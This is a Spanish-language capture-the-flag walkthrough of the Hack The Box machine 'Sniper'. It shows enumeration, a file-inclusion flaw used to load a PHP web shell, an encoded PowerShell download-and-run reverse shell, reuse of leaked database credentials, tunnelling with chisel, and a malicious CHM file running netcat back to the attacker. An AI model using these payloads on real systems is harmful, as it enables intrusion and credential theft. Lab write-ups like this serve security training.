---
layout: post
title: Sniper
date: 2023-03-22
description:
img:
fig-caption:
tags: [OSCP, eWPT]
---
___

<center><img src="/writeups/assets/img/Sniper-htb/Sniper.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos

* LFI

* RFI

* Information Disclosure

* Reutilización de credenciales

* Creación de CHM (Escalada de Privilegios)

***

# Reconocimiento

## Escaneo de puertos con nmap

### Descubrimiento de puertos abiertos

```null
nmap -p- --open --min-rate 5000 -n -Pn 10.10.10.151 -oG openports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-22 11:46 GMT
Nmap scan report for 10.10.10.151
Host is up (0.13s latency).
Not shown: 65530 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
49667/tcp open  unknown
```

### Escaneo de versión y servicios de cada puerto

```null
nmap -sCV -p80,135,139,445,49667 10.10.10.151 -oN portscan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-22 12:08 GMT
Stats: 0:01:18 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
Nmap scan report for 10.10.10.151
Host is up (0.19s latency).

PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Sniper Co.
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
49667/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 6h59m58s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-03-22T19:09:10
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 102.93 seconds
```

## Puerto 445 (SMB)

Con ```crackmapexec``` aplico un escaneo para ver dominio, hostame y versiones

```null
crackmapexec smb 10.10.10.151
SMB         10.10.10.151    445    SNIPER           [*] Windows 10.0 Build 17763 x64 (name:SNIPER) (domain:Sniper) (signing:False) (SMBv1:False)
```

Añado el dominio ````sniper```` al ```/etc/hosts```

No puedo listar los recursos compartidos a nivel de red

```null
smbmap -H 10.10.10.151 -u 'null'
[!] Authentication error on 10.10.10.151
```

## Puerto 135 (RPC)

No tengo acceso

```null
rpcclient -U "" 10.10.10.151 -N
Cannot connect to server.  Error was NT_STATUS_ACCESS_DENIED
```

## Puerto 80 (HTTP)

Con ```whatweb``` analizo las tecnologías que está empleando el servidor web

```null
whatweb http://10.10.10.151
http://10.10.10.151 [200 OK] Bootstrap[3.0.0], Country[RESERVED][ZZ], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.10.10.151], JQuery[2.1.3], Microsoft-IIS[10.0], PHP[7.3.1], Script, Title[Sniper Co.], X-Powered-By[PHP/7.3.1]
```

La página pricipal se ve así:

<img src="/writeups/assets/img/Sniper-htb/1.png" alt="">

Aplico fuzzing para descubrir rutas

```null
gobuster dir -u http://10.10.10.151/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -t 100
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.151/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/03/22 12:16:08 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 150] [--> http://10.10.10.151/images/]
/blog                 (Status: 301) [Size: 148] [--> http://10.10.10.151/blog/]
/js                   (Status: 301) [Size: 146] [--> http://10.10.10.151/js/]
/css                  (Status: 301) [Size: 147] [--> http://10.10.10.151/css/]
/user                 (Status: 301) [Size: 148] [--> http://10.10.10.151/user/]
Progress: 26426 / 26585 (99.40%)
===============================================================
2023/03/22 12:16:27 Finished
===============================================================
```

En ```/user``` hay un panel de autenticación

<img src="/writeups/assets/img/Sniper-htb/2.png" alt="">

Hago lo mismo para los archivos PHP

```null
 gobuster dir -u http://10.10.10.151/user/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-files-lowercase.txt -t 100 -x php
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.151/user/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-files-lowercase.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2023/03/22 12:20:19 Starting gobuster in directory enumeration mode
===============================================================
/login.php            (Status: 200) [Size: 5456]
/index.php            (Status: 302) [Size: 0] [--> login.php]
/logout.php           (Status: 302) [Size: 3] [--> login.php]
/auth.php             (Status: 302) [Size: 0] [--> login.php]
/.                    (Status: 302) [Size: 0] [--> login.php]
/db.php               (Status: 200) [Size: 0]
/registration.php     (Status: 200) [Size: 5922]
Progress: 32256 / 32490 (99.28%)
===============================================================
2023/03/22 12:20:42 Finished
===============================================================
```

Me puedo registrar, pero al iniciar sesión no accedo a ninguna interfaz

<img src="/writeups/assets/img/Sniper-htb/3.png" alt="">

En el ```/blog``` hay un parámetro vulnerable a LFI

```null
curl -s -X GET 'http://10.10.10.151/blog/?lang=\Windows\System32\drivers\etc\hosts' | html2text
    * Home
    * Language
          o English
          o Spanish
          o French
    * Download
          o Tools
          o Backlink

Fostrap
# Copyright (c) 1993-2009 Microsoft Corp. # # This is a sample HOSTS file used
by Microsoft TCP/IP for Windows. # # This file contains the mappings of IP
addresses to host names. Each # entry should be kept on an individual line. The
IP address should # be placed in the first column followed by the corresponding
host name. # The IP address and the host name should be separated by at least
one # space. # # Additionally, comments (such as these) may be inserted on
individual # lines or following the machine name denoted by a '#' symbol. # #
For example: # # 102.54.94.97 rhino.acme.com # source server # 38.25.63.10
x.acme.com # x client host # localhost name resolution is handled within DNS
itself. # 127.0.0.1 localhost # ::1 localhost
```

También puedo cargar archivos remotos compartidos por un servicio SMB

```null
impacket-smbserver shared $(pwd) -smb2support
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.10.151,49683)
[*] AUTHENTICATE_MESSAGE (\,SNIPER)
[*] User SNIPER\ authenticated successfully
[*] :::00::aaaaaaaaaaaaaaaa
[*] Connecting Share(1:IPC$)
[-] SMB2_TREE_CONNECT not found PWNED.PHP
[-] SMB2_TREE_CONNECT not found PWNED.PHP
```

```null
curl -s -X GET 'http://10.10.10.151/blog/?lang=\\10.10.16.4/pwned.php' | html2text
    * Home
    * Language
          o English
          o Spanish
          o French
    * Download
          o Tools
          o Backlink

Fostrap

OH!
***** Sorry! Page not found *****
```

Existe otra forma de hacerlo para aquellos casos en los que no se pueda ver el hash NetNTLMv2

```null
service smbd start
```

```null
net usershare add shared $(pwd) '' 'Everyone:F' 'guest_ok=y'
```

Creo un archivo en PHP que me permita ejecutar comandos

```null
catr pwned.php
<?php
  system($_REQUEST['cmd']);
?>
```

```null
curl -s -X GET 'http://10.10.10.151/blog/?lang=\\10.10.16.4\shared\pwned.php&cmd=whoami' | html2text
    * Home
    * Language
          o English
          o Spanish
          o French
    * Download
          o Tools
          o Backlink

Fostrap
nt authority\iusr
```

Me envío una reverse shell y gano acceso al sistema

```null
curl -s -X GET 'http://10.10.10.151/blog/?lang=\\10.10.16.4\shared\pwned.php&cmd=powershell+-e+SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAIgBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANgAuADQALwBJAG4AdgBvAGsAZQAtAFAAbwB3AGUAcgBTAGgAZQBsAGwAVABjAHAALgBwAHMAMQAiACkACgA=+2>%261' | html2text
```

```null
nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.4] from (UNKNOWN) [10.10.10.151] 49712
Windows PowerShell running as user SNIPER$ on SNIPER
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\inetpub\wwwroot\blog>
`` 

Un archivo contiene credenciales de acceso a la base de datos

```null
PS C:\inetpub\wwwroot\user> type db.php
<?php
// Enter your Host, username, password, database below.
// I left password empty because i do not set password on localhost.
$con = mysqli_connect("localhost","dbuser","36mEAhz/B8xQ~2VM","sniper");
// Check connection
if (mysqli_connect_errno())
  {
  echo "Failed to connect to MySQL: " . mysqli_connect_error();
  }
?>
```

Se reutiliza para el usuario Chris

```null
crackmapexec smb 10.10.10.151 -u 'Chris' -p '36mEAhz/B8xQ~2VM'
SMB         10.10.10.151    445    SNIPER           [*] Windows 10.0 Build 17763 x64 (name:SNIPER) (domain:Sniper) (signing:False) (SMBv1:False)
SMB         10.10.10.151    445    SNIPER           [+] Sniper\Chris:36mEAhz/B8xQ~2VM 
```

Utilizo el chisel para traerme el ```winrm```

En mi máquina creo el servidor

```null
chisel server -p 1234 --reverse
```

Desde la máquina víctima me conecto

```null
PS C:\Temp> .\chisel.exe client 10.10.16.4:1234 R:socks
```

Me conecto pasando por ```proxychains```

```null
proxychains evil-winrm -i localhost -u 'Chris' -p '36mEAhz/B8xQ~2VM'
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Chris\Documents> 
```

Puedo ver la primera flag

```null
*Evil-WinRM* PS C:\Users\Chris\Desktop> type user.txt
8ae9aa4887837a69ef15b31f4338668e
```

# Escalada

En el directorio ```C:\Docs``` hay dos archivos con contenido

```null
*Evil-WinRM* PS C:\Docs> dir


    Directory: C:\Docs


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        4/11/2019   9:31 AM            285 note.txt
-a----        4/11/2019   9:17 AM         552607 php for dummies-trial.pdf


*Evil-WinRM* PS C:\Docs> type note.txt
Hi Chris,
	Your php skillz suck. Contact yamitenshi so that he teaches you how to use it and after that fix the website as there are a lot of bugs on it. And I hope that you've prepared the documentation for our new app. Drop it here when you're done with it.

Regards,
Sniper CEO.
```

Se está esperando que se suba algo en este directorio

En el directorio personal del usuario ```Chris``` hay un documento

```null
*Evil-WinRM* PS C:\Users\Chris\Downloads> dir


    Directory: C:\Users\Chris\Downloads


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        4/11/2019   8:36 AM          10462 instructions.chm
```

Utilizo esta [guía](https://gist.github.com/mgeeky/cce31c8602a144d8f2172a73d510e0e7) para crear un archivo CHM malicioso. Hay que instalar el ```HTML Help Workshop```, pero el enlace oficial está caído

<img src="/writeups/assets/img/Sniper-htb/4.png" alt="">

A través de [WayBack Machine](https://web.archive.org/web/20160201063255/http://download.microsoft.com/download/0/A/9/0A939EF6-E31C-430F-A3DF-DFAE7960D564/htmlhelp.exe) se puede descargar

Creo el archivo y lo transfiero a mi máquina linux

```null
PS C:\Users\Usuario\Desktop> IEX(New-Object Net.WebClient).downloadString("https://raw.githubusercontent.com/samratashok/nishang/master/Client/Out-CHM.ps1")
PS C:\Users\Usuario\Desktop> Out-CHM -Payload "\\10.10.16.4\shared\nc.exe -e cmd 10.10.16.4 443" -HHCPath "C:\Program Files (x86)\HTML Help Workshop"
Microsoft HTML Help Compiler 4.74.8702

Compiling c:\Users\Usuario\Desktop\doc.chm


Compile time: 0 minutes, 0 seconds
2       Topics
4       Local links
4       Internet links
0       Graphics


Created c:\Users\Usuario\Desktop\doc.chm, 13,438 bytes
Compression increased file by 266 bytes.
```

Le cambio el nombre a ```instructions.chm```, que es lo que esperaba, y lo subo a ```C:\Docs```

```null
mv doc.chm instructions.chm
```

Puedo ver la segunda flag

```null
nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.4] from (UNKNOWN) [10.10.10.151] 49749
Microsoft Windows [Version 10.0.17763.678]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
type C:\Users\Administrator\Desktop\root.txt
214961b2fb76637dd77231cdc47a7894

C:\Windows\system32>
```